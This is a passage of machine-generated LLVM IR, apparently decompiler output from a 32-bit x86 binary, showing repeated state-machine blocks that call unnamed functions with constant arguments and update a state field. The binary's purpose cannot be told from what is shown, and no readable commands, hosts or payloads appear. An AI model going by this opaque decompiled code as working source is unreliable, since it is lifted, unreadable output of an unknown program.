  store i32 %v3_8050c97, i32* %eax.global-to-local, align 4
  %v0_8050c9c = load i32, i32* @esp, align 4
  %v1_8050c9c = add i32 %v0_8050c9c, -4
  %v2_8050c9c = inttoptr i32 %v1_8050c9c to i32*
  store i32 16384, i32* %v2_8050c9c, align 4
  %v1_8050ca1 = add i32 %v0_8050c9c, 1888
  %v2_8050ca1 = inttoptr i32 %v1_8050ca1 to i32*
  %v3_8050ca1 = load i32, i32* %v2_8050ca1, align 4
  store i32 %v3_8050ca1, i32* @esi, align 4
  %v2_8050ca8 = add i32 %v0_8050c9c, -8
  %v3_8050ca8 = inttoptr i32 %v2_8050ca8 to i32*
  store i32 %v3_8050ca1, i32* %v3_8050ca8, align 4
  %v2_8050ca9 = add i32 %v0_8050c9c, -12
  %v3_8050ca9 = inttoptr i32 %v2_8050ca9 to i32*
  store i32 %v3_8050c97, i32* %v3_8050ca9, align 4
  %v0_8050caa = load i32, i32* @edi, align 4
  %v1_8050caa = add i32 %v0_8050caa, 4
  %v2_8050caa = inttoptr i32 %v1_8050caa to i32*
  %v3_8050caa = load i32, i32* %v2_8050caa, align 4
  store i32 %v3_8050caa, i32* @ebx, align 4
  %v2_8050cad = add i32 %v0_8050c9c, -16
  %v3_8050cad = inttoptr i32 %v2_8050cad to i32*
  store i32 %v3_8050caa, i32* %v3_8050cad, align 4
  %v0_8050cae = call i32 @function_8052934()
  store i32 %v0_8050cae, i32* %eax.global-to-local, align 4
  %v0_8050cb3 = load i32, i32* @esp, align 4
  %v1_8050cb6 = add i32 %v0_8050cb3, 28
  %v2_8050cb6 = inttoptr i32 %v1_8050cb6 to i32*
  store i32 16384, i32* %v2_8050cb6, align 4
  %v1_8050cbb = add i32 %v0_8050cb3, 24
  %v2_8050cbb = inttoptr i32 %v1_8050cbb to i32*
  store i32 2, i32* %v2_8050cbb, align 4
  %v1_8050cbd = add i32 %v0_8050cb3, 20
  %v2_8050cbd = inttoptr i32 %v1_8050cbd to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8050cbd, align 4
  %v0_8050cc2 = load i32, i32* @edi, align 4
  %v1_8050cc2 = add i32 %v0_8050cc2, 4
  %v2_8050cc2 = inttoptr i32 %v1_8050cc2 to i32*
  %v3_8050cc2 = load i32, i32* %v2_8050cc2, align 4
  store i32 %v3_8050cc2, i32* %ecx.global-to-local, align 4
  %v2_8050cc5 = add i32 %v0_8050cb3, 16
  %v3_8050cc5 = inttoptr i32 %v2_8050cc5 to i32*
  store i32 %v3_8050cc2, i32* %v3_8050cc5, align 4
  %v0_8050cc6 = call i32 @function_8052934()
  store i32 %v0_8050cc6, i32* %eax.global-to-local, align 4
  %v0_8050ccb = load i32, i32* @esp, align 4
  %v1_8050ccb = inttoptr i32 %v0_8050ccb to i32*
  store i32 22, i32* %v1_8050ccb, align 4
  %v2_8050cd2 = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050cd2, i32* %eax.global-to-local, align 4
  %v0_8050cda = load i32, i32* @edi, align 4
  %v1_8050cda = add i32 %v0_8050cda, 12
  %v2_8050cda = inttoptr i32 %v1_8050cda to i32*
  store i32 7, i32* %v2_8050cda, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050ce6:                             ; preds = %dec_label_pc_8050a67, %dec_label_pc_8050a5e, %dec_label_pc_8050a55, %dec_label_pc_8050a4c, %dec_label_pc_8050a3f
  %v1_8050ce6 = add i32 %v0_8050ce6, 1
  store i32 %v1_8050ce6, i32* @ebp, align 4
  %v10_8050ce9 = icmp eq i32 %v0_8050ce6, -2
  br i1 %v10_8050ce9, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050cf2

dec_label_pc_8050cf2:                             ; preds = %dec_label_pc_8050ce6
  %tmp151 = icmp slt i32 %v1_8050ce6, 1
  br i1 %tmp151, label %dec_label_pc_8050a83, label %dec_label_pc_8050cfa

dec_label_pc_8050cfa:                             ; preds = %dec_label_pc_8050cf2
  %v0_8050cfa = load i32, i32* @esp, align 4
  %v1_8050cfd = add i32 %v0_8050cfa, -16
  %v2_8050cfd = inttoptr i32 %v1_8050cfd to i32*
  store i32 24, i32* %v2_8050cfd, align 4
  %v2_8050cff = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050cff, i32* %eax.global-to-local, align 4
  %v0_8050d04 = load i32, i32* @esp, align 4
  %v1_8050d04 = inttoptr i32 %v0_8050d04 to i32*
  %v2_8050d04 = load i32, i32* %v1_8050d04, align 4
  store i32 %v2_8050d04, i32* %eax.global-to-local, align 4
  %v3_8050d04 = add i32 %v0_8050d04, 4
  %v1_8050d05 = inttoptr i32 %v3_8050d04 to i32*
  %v1_8050d06 = add i32 %v0_8050d04, 1880
  store i32 %v1_8050d06, i32* %edx.global-to-local, align 4
  store i32 %v1_8050d06, i32* %v1_8050d05, align 4
  store i32 24, i32* %v1_8050d04, align 4
  %v3_8050d10 = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050d10, i32* %eax.global-to-local, align 4
  %v0_8050d15 = load i32, i32* @esp, align 4
  %v1_8050d15 = add i32 %v0_8050d15, -4
  %v2_8050d15 = inttoptr i32 %v1_8050d15 to i32*
  store i32 16384, i32* %v2_8050d15, align 4
  %v1_8050d1a = add i32 %v0_8050d15, 1880
  %v2_8050d1a = inttoptr i32 %v1_8050d1a to i32*
  %v3_8050d1a = load i32, i32* %v2_8050d1a, align 4
  store i32 %v3_8050d1a, i32* @esi, align 4
  %v2_8050d21 = add i32 %v0_8050d15, -8
  %v3_8050d21 = inttoptr i32 %v2_8050d21 to i32*
  store i32 %v3_8050d1a, i32* %v3_8050d21, align 4
  %v2_8050d22 = add i32 %v0_8050d15, -12
  %v3_8050d22 = inttoptr i32 %v2_8050d22 to i32*
  store i32 %v3_8050d10, i32* %v3_8050d22, align 4
  %v0_8050d23 = load i32, i32* @edi, align 4
  %v1_8050d23 = add i32 %v0_8050d23, 4
  %v2_8050d23 = inttoptr i32 %v1_8050d23 to i32*
  %v3_8050d23 = load i32, i32* %v2_8050d23, align 4
  store i32 %v3_8050d23, i32* @ebx, align 4
  %v2_8050d26 = add i32 %v0_8050d15, -16
  %v3_8050d26 = inttoptr i32 %v2_8050d26 to i32*
  store i32 %v3_8050d23, i32* %v3_8050d26, align 4
  %v0_8050d27 = call i32 @function_8052934()
  store i32 %v0_8050d27, i32* %eax.global-to-local, align 4
  %v0_8050d2c = load i32, i32* @esp, align 4
  %v1_8050d2f = add i32 %v0_8050d2c, 28
  %v2_8050d2f = inttoptr i32 %v1_8050d2f to i32*
  store i32 16384, i32* %v2_8050d2f, align 4
  %v1_8050d34 = add i32 %v0_8050d2c, 24
  %v2_8050d34 = inttoptr i32 %v1_8050d34 to i32*
  store i32 2, i32* %v2_8050d34, align 4
  %v1_8050d36 = add i32 %v0_8050d2c, 20
  %v2_8050d36 = inttoptr i32 %v1_8050d36 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8050d36, align 4
  %v0_8050d3b = load i32, i32* @edi, align 4
  %v1_8050d3b = add i32 %v0_8050d3b, 4
  %v2_8050d3b = inttoptr i32 %v1_8050d3b to i32*
  %v3_8050d3b = load i32, i32* %v2_8050d3b, align 4
  store i32 %v3_8050d3b, i32* %ecx.global-to-local, align 4
  %v2_8050d3e = add i32 %v0_8050d2c, 16
  %v3_8050d3e = inttoptr i32 %v2_8050d3e to i32*
  store i32 %v3_8050d3b, i32* %v3_8050d3e, align 4
  %v0_8050d3f = call i32 @function_8052934()
  store i32 %v0_8050d3f, i32* %eax.global-to-local, align 4
  %v0_8050d44 = load i32, i32* @esp, align 4
  %v1_8050d44 = inttoptr i32 %v0_8050d44 to i32*
  store i32 24, i32* %v1_8050d44, align 4
  %v2_8050d4b = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d4b, i32* %eax.global-to-local, align 4
  %v0_8050d53 = load i32, i32* @edi, align 4
  %v1_8050d53 = add i32 %v0_8050d53, 12
  %v2_8050d53 = inttoptr i32 %v1_8050d53 to i32*
  store i32 10, i32* %v2_8050d53, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050d5f:                             ; preds = %dec_label_pc_8050814, %dec_label_pc_805080b, %dec_label_pc_8050802, %dec_label_pc_80507f9, %dec_label_pc_80507ec
  %v1_8050d5f = add i32 %v0_8050d5f, 1
  store i32 %v1_8050d5f, i32* @ebp, align 4
  %v10_8050d62 = icmp eq i32 %v0_8050d5f, -2
  br i1 %v10_8050d62, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050d6b

dec_label_pc_8050d6b:                             ; preds = %dec_label_pc_8050d5f
  %tmp152 = icmp slt i32 %v1_8050d5f, 1
  br i1 %tmp152, label %dec_label_pc_8050a83, label %dec_label_pc_8050d73

dec_label_pc_8050d73:                             ; preds = %dec_label_pc_8050d6b
  %v0_8050d73 = load i32, i32* @esp, align 4
  %v1_8050d76 = add i32 %v0_8050d73, -16
  %v2_8050d76 = inttoptr i32 %v1_8050d76 to i32*
  store i32 23, i32* %v2_8050d76, align 4
  %v2_8050d78 = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d78, i32* %eax.global-to-local, align 4
  %v0_8050d7d = load i32, i32* @esp, align 4
  %v1_8050d7d = inttoptr i32 %v0_8050d7d to i32*
  %v2_8050d7d = load i32, i32* %v1_8050d7d, align 4
  store i32 %v2_8050d7d, i32* %eax.global-to-local, align 4
  %v3_8050d7d = add i32 %v0_8050d7d, 4
  %v1_8050d7e = inttoptr i32 %v3_8050d7d to i32*
  %v2_8050d7e = load i32, i32* %v1_8050d7e, align 4
  store i32 %v2_8050d7e, i32* %edx.global-to-local, align 4
  %v1_8050d7f = add i32 %v0_8050d7d, 1880
  store i32 %v1_8050d7f, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d7f, i32* %v1_8050d7e, align 4
  store i32 23, i32* %v1_8050d7d, align 4
  %v3_8050d89 = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050d89, i32* %eax.global-to-local, align 4
  %v0_8050d8e = load i32, i32* @esp, align 4
  %v1_8050d8e = add i32 %v0_8050d8e, -4
  %v2_8050d8e = inttoptr i32 %v1_8050d8e to i32*
  store i32 16384, i32* %v2_8050d8e, align 4
  %v1_8050d93 = add i32 %v0_8050d8e, 1880
  %v2_8050d93 = inttoptr i32 %v1_8050d93 to i32*
  %v3_8050d93 = load i32, i32* %v2_8050d93, align 4
  store i32 %v3_8050d93, i32* @esi, align 4
  %v2_8050d9a = add i32 %v0_8050d8e, -8
  %v3_8050d9a = inttoptr i32 %v2_8050d9a to i32*
  store i32 %v3_8050d93, i32* %v3_8050d9a, align 4
  %v2_8050d9b = add i32 %v0_8050d8e, -12
  %v3_8050d9b = inttoptr i32 %v2_8050d9b to i32*
  store i32 %v3_8050d89, i32* %v3_8050d9b, align 4
  %v0_8050d9c = load i32, i32* @edi, align 4
  %v1_8050d9c = add i32 %v0_8050d9c, 4
  %v2_8050d9c = inttoptr i32 %v1_8050d9c to i32*
  %v3_8050d9c = load i32, i32* %v2_8050d9c, align 4
  store i32 %v3_8050d9c, i32* @ebx, align 4
  %v2_8050d9f = add i32 %v0_8050d8e, -16
  %v3_8050d9f = inttoptr i32 %v2_8050d9f to i32*
  store i32 %v3_8050d9c, i32* %v3_8050d9f, align 4
  %v0_8050da0 = call i32 @function_8052934()
  store i32 %v0_8050da0, i32* %eax.global-to-local, align 4
  %v0_8050da5 = load i32, i32* @esp, align 4
  %v1_8050da8 = add i32 %v0_8050da5, 28
  %v2_8050da8 = inttoptr i32 %v1_8050da8 to i32*
  store i32 16384, i32* %v2_8050da8, align 4
  %v1_8050dad = add i32 %v0_8050da5, 24
  %v2_8050dad = inttoptr i32 %v1_8050dad to i32*
  store i32 2, i32* %v2_8050dad, align 4
  %v1_8050daf = add i32 %v0_8050da5, 20
  %v2_8050daf = inttoptr i32 %v1_8050daf to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8050daf, align 4
  %v0_8050db4 = load i32, i32* @edi, align 4
  %v1_8050db4 = add i32 %v0_8050db4, 4
  %v2_8050db4 = inttoptr i32 %v1_8050db4 to i32*
  %v3_8050db4 = load i32, i32* %v2_8050db4, align 4
  store i32 %v3_8050db4, i32* %ecx.global-to-local, align 4
  %v2_8050db7 = add i32 %v0_8050da5, 16
  %v3_8050db7 = inttoptr i32 %v2_8050db7 to i32*
  store i32 %v3_8050db4, i32* %v3_8050db7, align 4
  %v0_8050db8 = call i32 @function_8052934()
  store i32 %v0_8050db8, i32* %eax.global-to-local, align 4
  %v0_8050dbd = load i32, i32* @esp, align 4
  %v1_8050dbd = inttoptr i32 %v0_8050dbd to i32*
  store i32 23, i32* %v1_8050dbd, align 4
  %v2_8050dc4 = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050dc4, i32* %eax.global-to-local, align 4
  %v0_8050dcc = load i32, i32* @edi, align 4
  %v1_8050dcc = add i32 %v0_8050dcc, 12
  %v2_8050dcc = inttoptr i32 %v1_8050dcc to i32*
  store i32 9, i32* %v2_8050dcc, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050dd8:                             ; preds = %dec_label_pc_80505d6, %dec_label_pc_80505cd, %dec_label_pc_80505c4, %dec_label_pc_80505bb, %dec_label_pc_80505ae
  %v1_8050dd8 = add i32 %v0_8050dd8, 1
  store i32 %v1_8050dd8, i32* @ebp, align 4
  %v10_8050ddb = icmp eq i32 %v0_8050dd8, -2
  br i1 %v10_8050ddb, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050de4

dec_label_pc_8050de4:                             ; preds = %dec_label_pc_8050dd8
  %tmp153 = icmp slt i32 %v1_8050dd8, 1
  br i1 %tmp153, label %dec_label_pc_8050a83, label %dec_label_pc_8050dec

dec_label_pc_8050dec:                             ; preds = %dec_label_pc_8050de4
  %v0_8050dec = load i32, i32* @esp, align 4
  %v1_8050def = add i32 %v0_8050dec, -16
  %v2_8050def = inttoptr i32 %v1_8050def to i32*
  store i32 21, i32* %v2_8050def, align 4
  %v2_8050df1 = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050df1, i32* %eax.global-to-local, align 4
  %v0_8050df6 = load i32, i32* @esp, align 4
  %v1_8050df6 = inttoptr i32 %v0_8050df6 to i32*
  %v2_8050df6 = load i32, i32* %v1_8050df6, align 4
  store i32 %v2_8050df6, i32* %eax.global-to-local, align 4
  %v3_8050df6 = add i32 %v0_8050df6, 4
  %v1_8050df7 = inttoptr i32 %v3_8050df6 to i32*
  %v2_8050df7 = load i32, i32* %v1_8050df7, align 4
  store i32 %v2_8050df7, i32* %edx.global-to-local, align 4
  %v1_8050df8 = add i32 %v0_8050df6, 1880
  store i32 %v1_8050df8, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050df8, i32* %v1_8050df7, align 4
  store i32 21, i32* %v1_8050df6, align 4
  %v3_8050e02 = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050e02, i32* %eax.global-to-local, align 4
  %v0_8050e07 = load i32, i32* @esp, align 4
  %v1_8050e07 = add i32 %v0_8050e07, -4
  %v2_8050e07 = inttoptr i32 %v1_8050e07 to i32*
  store i32 16384, i32* %v2_8050e07, align 4
  %v1_8050e0c = add i32 %v0_8050e07, 1880
  %v2_8050e0c = inttoptr i32 %v1_8050e0c to i32*
  %v3_8050e0c = load i32, i32* %v2_8050e0c, align 4
  store i32 %v3_8050e0c, i32* @esi, align 4
  %v2_8050e13 = add i32 %v0_8050e07, -8
  %v3_8050e13 = inttoptr i32 %v2_8050e13 to i32*
  store i32 %v3_8050e0c, i32* %v3_8050e13, align 4
  %v2_8050e14 = add i32 %v0_8050e07, -12
  %v3_8050e14 = inttoptr i32 %v2_8050e14 to i32*
  store i32 %v3_8050e02, i32* %v3_8050e14, align 4
  %v0_8050e15 = load i32, i32* @edi, align 4
  %v1_8050e15 = add i32 %v0_8050e15, 4
  %v2_8050e15 = inttoptr i32 %v1_8050e15 to i32*
  %v3_8050e15 = load i32, i32* %v2_8050e15, align 4
  store i32 %v3_8050e15, i32* @ebx, align 4
  %v2_8050e18 = add i32 %v0_8050e07, -16
  %v3_8050e18 = inttoptr i32 %v2_8050e18 to i32*
  store i32 %v3_8050e15, i32* %v3_8050e18, align 4
  %v0_8050e19 = call i32 @function_8052934()
  store i32 %v0_8050e19, i32* %eax.global-to-local, align 4
  %v0_8050e1e = load i32, i32* @esp, align 4
  %v1_8050e21 = add i32 %v0_8050e1e, 28
  %v2_8050e21 = inttoptr i32 %v1_8050e21 to i32*
  store i32 16384, i32* %v2_8050e21, align 4
  %v1_8050e26 = add i32 %v0_8050e1e, 24
  %v2_8050e26 = inttoptr i32 %v1_8050e26 to i32*
  store i32 2, i32* %v2_8050e26, align 4
  %v1_8050e28 = add i32 %v0_8050e1e, 20
  %v2_8050e28 = inttoptr i32 %v1_8050e28 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8050e28, align 4
  %v0_8050e2d = load i32, i32* @edi, align 4
  %v1_8050e2d = add i32 %v0_8050e2d, 4
  %v2_8050e2d = inttoptr i32 %v1_8050e2d to i32*
  %v3_8050e2d = load i32, i32* %v2_8050e2d, align 4
  store i32 %v3_8050e2d, i32* %ecx.global-to-local, align 4
  %v2_8050e30 = add i32 %v0_8050e1e, 16
  %v3_8050e30 = inttoptr i32 %v2_8050e30 to i32*
  store i32 %v3_8050e2d, i32* %v3_8050e30, align 4
  %v0_8050e31 = call i32 @function_8052934()
  store i32 %v0_8050e31, i32* %eax.global-to-local, align 4
  %v0_8050e36 = load i32, i32* @esp, align 4
  %v1_8050e36 = inttoptr i32 %v0_8050e36 to i32*
  store i32 21, i32* %v1_8050e36, align 4
  %v2_8050e3d = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050e3d, i32* %eax.global-to-local, align 4
  %v0_8050e45 = load i32, i32* @edi, align 4
  %v1_8050e45 = add i32 %v0_8050e45, 12
  %v2_8050e45 = inttoptr i32 %v1_8050e45 to i32*
  store i32 6, i32* %v2_8050e45, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050e51:                             ; preds = %dec_label_pc_8050870
  %v2_8050e5b = load i32, i32* %v1_8050e5b, align 4
  store i32 %v2_8050e5b, i32* %eax.global-to-local, align 4
  %v0_8050e5c = load i32, i32* @edi, align 4
  %v1_8050e5c = add i32 %v0_8050e5c, 4
  %v2_8050e5c = inttoptr i32 %v1_8050e5c to i32*
  %v3_8050e5c = load i32, i32* %v2_8050e5c, align 4
  store i32 %v3_8050e5c, i32* %eax.global-to-local, align 4
  store i32 %v3_8050e5c, i32* %v1_8050e5b, align 4
  %v1_8050e60 = call i32 @function_80521f1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050e60, i32* %eax.global-to-local, align 4
  %v0_8050e65 = load i32, i32* @edi, align 4
  %v1_8050e65 = add i32 %v0_8050e65, 284
  %v2_8050e65 = inttoptr i32 %v1_8050e65 to i8*
  %v3_8050e65 = load i8, i8* %v2_8050e65, align 1
  %v4_8050e65 = zext i8 %v3_8050e65 to i32
  %v6_8050e65 = and i32 %v1_8050e60, -256
  %v7_8050e65 = or i32 %v4_8050e65, %v6_8050e65
  %v1_8050e6e = add i32 %v7_8050e65, 1
  store i32 %v1_8050e6e, i32* %eax.global-to-local, align 4
  %v1_8050e6f = add i32 %v0_8050e65, 4
  %v2_8050e6f = inttoptr i32 %v1_8050e6f to i32*
  store i32 -1, i32* %v2_8050e6f, align 4
  %v0_8050e76 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e76 = trunc i32 %v0_8050e76 to i8
  %v2_8050e76 = load i32, i32* @edi, align 4
  %v3_8050e76 = add i32 %v2_8050e76, 284
  %v4_8050e76 = inttoptr i32 %v3_8050e76 to i8*
  store i8 %v1_8050e76, i8* %v4_8050e76, align 1
  %v0_8050e7c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e7c = trunc i32 %v0_8050e7c to i8
  %v10_8050e7c = icmp eq i8 %v1_8050e7c, 10
  %v1_8050e7e = icmp eq i1 %v10_8050e7c, false
  br i1 %v1_8050e7e, label %dec_label_pc_8051010, label %dec_label_pc_8050e84

dec_label_pc_8050e84:                             ; preds = %dec_label_pc_8050e51
  store i32 -1, i32* @ebp, align 4
  %v0_8050e87 = load i32, i32* @edi, align 4
  %v1_8050e87 = add i32 %v0_8050e87, 284
  %v2_8050e87 = inttoptr i32 %v1_8050e87 to i8*
  store i8 0, i8* %v2_8050e87, align 1
  %v0_8050e8e = load i32, i32* @edi, align 4
  %v1_8050e8e = add i32 %v0_8050e8e, 12
  %v2_8050e8e = inttoptr i32 %v1_8050e8e to i32*
  store i32 0, i32* %v2_8050e8e, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050e9a:                             ; preds = %dec_label_pc_8050b04
  %v1_8050e9a = add i32 %v0_8050af0, -4
  %v2_8050e9a = inttoptr i32 %v1_8050e9a to i32*
  store i32 16384, i32* %v2_8050e9a, align 4
  %v1_8050e9f = add i32 %v0_8050af0, -8
  %v2_8050e9f = inttoptr i32 %v1_8050e9f to i32*
  store i32 3, i32* %v2_8050e9f, align 4
  %v1_8050ea1 = add i32 %v0_8050af0, 1879
  store i32 %v1_8050ea1, i32* %eax.global-to-local, align 4
  %v0_8050ea8 = load i32, i32* @ebx, align 4
  %v1_8050ea8 = add i32 %v0_8050ea8, 3
  store i32 %v1_8050ea8, i32* @ebx, align 4
  %v2_8050eab = add i32 %v0_8050af0, -12
  %v3_8050eab = inttoptr i32 %v2_8050eab to i32*
  store i32 %v1_8050ea1, i32* %v3_8050eab, align 4
  %v0_8050eac = load i32, i32* @ebp, align 4
  %v1_8050eac = add i32 %v0_8050eac, 3
  store i32 %v1_8050eac, i32* @ebp, align 4
  %v0_8050eaf = load i32, i32* @edi, align 4
  %v1_8050eaf = add i32 %v0_8050eaf, 4
  %v2_8050eaf = inttoptr i32 %v1_8050eaf to i32*
  %v3_8050eaf = load i32, i32* %v2_8050eaf, align 4
  store i32 %v3_8050eaf, i32* @esi, align 4
  %v2_8050eb2 = add i32 %v0_8050af0, -16
  %v3_8050eb2 = inttoptr i32 %v2_8050eb2 to i32*
  store i32 %v3_8050eaf, i32* %v3_8050eb2, align 4
  %v0_8050eb3 = call i32 @function_8052934()
  %v0_8050eb8 = load i32, i32* @esp, align 4
  %v1_8050eb8 = add i32 %v0_8050eb8, -4
  %v2_8050eb8 = inttoptr i32 %v1_8050eb8 to i32*
  store i32 16384, i32* %v2_8050eb8, align 4
  %v1_8050ebd = add i32 %v0_8050eb8, -8
  %v2_8050ebd = inttoptr i32 %v1_8050ebd to i32*
  store i32 9, i32* %v2_8050ebd, align 4
  %v1_8050ebf = add i32 %v0_8050eb8, 1863
  store i32 %v1_8050ebf, i32* %eax.global-to-local, align 4
  %v2_8050ec6 = add i32 %v0_8050eb8, -12
  %v3_8050ec6 = inttoptr i32 %v2_8050ec6 to i32*
  store i32 %v1_8050ebf, i32* %v3_8050ec6, align 4
  %v0_8050ec7 = load i32, i32* @edi, align 4
  %v1_8050ec7 = add i32 %v0_8050ec7, 4
  %v2_8050ec7 = inttoptr i32 %v1_8050ec7 to i32*
  %v3_8050ec7 = load i32, i32* %v2_8050ec7, align 4
  store i32 %v3_8050ec7, i32* %ecx.global-to-local, align 4
  %v2_8050eca = add i32 %v0_8050eb8, -16
  %v3_8050eca = inttoptr i32 %v2_8050eca to i32*
  store i32 %v3_8050ec7, i32* %v3_8050eca, align 4
  %v0_8050ecb = call i32 @function_8052934()
  store i32 %v0_8050ecb, i32* %eax.global-to-local, align 4
  %v0_8050ed0 = load i32, i32* @esp, align 4
  %v1_8050ed0 = add i32 %v0_8050ed0, 32
  %v0_8050ed3 = load i32, i32* @edi, align 4
  %v1_8050ed3 = add i32 %v0_8050ed3, 24
  %v2_8050ed3 = inttoptr i32 %v1_8050ed3 to i32*
  %v3_8050ed3 = load i32, i32* %v2_8050ed3, align 4
  store i32 %v3_8050ed3, i32* %edx.global-to-local, align 4
  %v0_805066d.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805066d.backedge

dec_label_pc_8050edb:                             ; preds = %dec_label_pc_8050557
  %v1_8050edb = add i32 %v0_8050561, 1872
  %v2_8050edb = inttoptr i32 %v1_8050edb to i32*
  store i32 0, i32* %v2_8050edb, align 4
  %v0_8050ee6 = load i32, i32* @esp, align 4
  %v1_8050ee6 = add i32 %v0_8050ee6, 1864
  %v2_8050ee6 = inttoptr i32 %v1_8050ee6 to i32*
  store i32 4, i32* %v2_8050ee6, align 4
  %v0_8050ef1 = load i32, i32* @esp, align 4
  %v1_8050ef4 = add i32 %v0_8050ef1, 1864
  %v2_8050efb = add i32 %v0_8050ef1, -16
  %v3_8050efb = inttoptr i32 %v2_8050efb to i32*
  store i32 %v1_8050ef4, i32* %v3_8050efb, align 4
  %v1_8050efc = add i32 %v0_8050ef1, 1872
  store i32 %v1_8050efc, i32* %eax.global-to-local, align 4
  %v2_8050f03 = add i32 %v0_8050ef1, -20
  %v3_8050f03 = inttoptr i32 %v2_8050f03 to i32*
  store i32 %v1_8050efc, i32* %v3_8050f03, align 4
  %v1_8050f04 = add i32 %v0_8050ef1, -24
  %v2_8050f04 = inttoptr i32 %v1_8050f04 to i32*
  store i32 4, i32* %v2_8050f04, align 4
  %v1_8050f06 = add i32 %v0_8050ef1, -28
  %v2_8050f06 = inttoptr i32 %v1_8050f06 to i32*
  store i32 1, i32* %v2_8050f06, align 4
  %v0_8050f08 = load i32, i32* @edi, align 4
  %v1_8050f08 = add i32 %v0_8050f08, 4
  %v2_8050f08 = inttoptr i32 %v1_8050f08 to i32*
  %v3_8050f08 = load i32, i32* %v2_8050f08, align 4
  store i32 %v3_8050f08, i32* %eax.global-to-local, align 4
  %v2_8050f0b = add i32 %v0_8050ef1, -32
  %v3_8050f0b = inttoptr i32 %v2_8050f0b to i32*
  store i32 %v3_8050f08, i32* %v3_8050f0b, align 4
  %v0_8050f0c = call i32 @function_8052860()
  store i32 %v0_8050f0c, i32* %eax.global-to-local, align 4
  %v0_8050f11 = load i32, i32* @esp, align 4
  %v2_8050f14 = add i32 %v0_8050f11, 1904
  %v3_8050f14 = inttoptr i32 %v2_8050f14 to i32*
  %v4_8050f14 = load i32, i32* %v3_8050f14, align 4
  %v5_8050f14 = or i32 %v4_8050f14, %v0_8050f0c
  %v6_8050f14 = icmp eq i32 %v5_8050f14, 0
  store i32 %v5_8050f14, i32* %eax.global-to-local, align 4
  %v1_8050f1b = icmp eq i1 %v6_8050f14, false
  br i1 %v1_8050f1b, label %dec_label_pc_8050f7c, label %dec_label_pc_8050f1d

dec_label_pc_8050f1d:                             ; preds = %dec_label_pc_8050edb
  %v0_8050f1d = load i32, i32* @edi, align 4
  %v1_8050f1d = add i32 %v0_8050f1d, 12
  %v2_8050f1d = inttoptr i32 %v1_8050f1d to i32*
  store i32 2, i32* %v2_8050f1d, align 4
  %v1_8050f24 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_8050f24 = sext i32 %v1_8050f24 to i64
  %v0_8050f29 = load i16, i16* @global_var_805692c.49, align 4
  %v1_8050f29 = zext i16 %v0_8050f29 to i32
  %v0_8050f36 = load i32, i32* @global_var_80568f8.50, align 8
  store i32 %v0_8050f36, i32* @ebx, align 4
  store i32 %v1_8050f29, i32* %ecx.global-to-local, align 4
  %v8_8050f40 = zext i16 %v0_8050f29 to i64
  %v9_8050f40 = udiv i64 %v2_8050f24, %v8_8050f40
  %v10_8050f40 = trunc i64 %v9_8050f40 to i32
  store i32 %v10_8050f40, i32* %eax.global-to-local, align 4
  %v11_8050f40 = urem i64 %v2_8050f24, %v8_8050f40
  %v12_8050f40 = trunc i64 %v11_8050f40 to i32
  store i32 %v12_8050f40, i32* %edx.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_8050f36, 1
  br i1 %tmp154, label %dec_label_pc_8051041, label %dec_label_pc_8050f4a

dec_label_pc_8050f4a:                             ; preds = %dec_label_pc_8050f1d
  %v0_8050f4a = load i32, i32* @global_var_8056928.51, align 8
  store i32 %v0_8050f4a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8050f5f = trunc i64 %v11_8050f40 to i16
  br label %dec_label_pc_8050f5f

dec_label_pc_8050f53:                             ; preds = %dec_label_pc_8050f65, %dec_label_pc_8050f5f
  %v1_8050f53 = add i32 %v0_8050f53, 1
  store i32 %v1_8050f53, i32* %ecx.global-to-local, align 4
  %v1_8050f54 = add i32 %v0_8050f54, 16
  store i32 %v1_8050f54, i32* %eax.global-to-local, align 4
  %v12_8050f57 = icmp eq i32 %v1_8050f53, %v0_8050f36
  br i1 %v12_8050f57, label %dec_label_pc_8051041.loopexit, label %dec_label_pc_8050f5f

dec_label_pc_8050f5f:                             ; preds = %dec_label_pc_8050f53, %dec_label_pc_8050f4a
  %v0_8050f53 = phi i32 [ %v1_8050f53, %dec_label_pc_8050f53 ], [ 0, %dec_label_pc_8050f4a ]
  %v0_8050f54 = phi i32 [ %v1_8050f54, %dec_label_pc_8050f53 ], [ %v0_8050f4a, %dec_label_pc_8050f4a ]
  %v3_8050f5f = add i32 %v0_8050f54, 8
  %v4_8050f5f = inttoptr i32 %v3_8050f5f to i16*
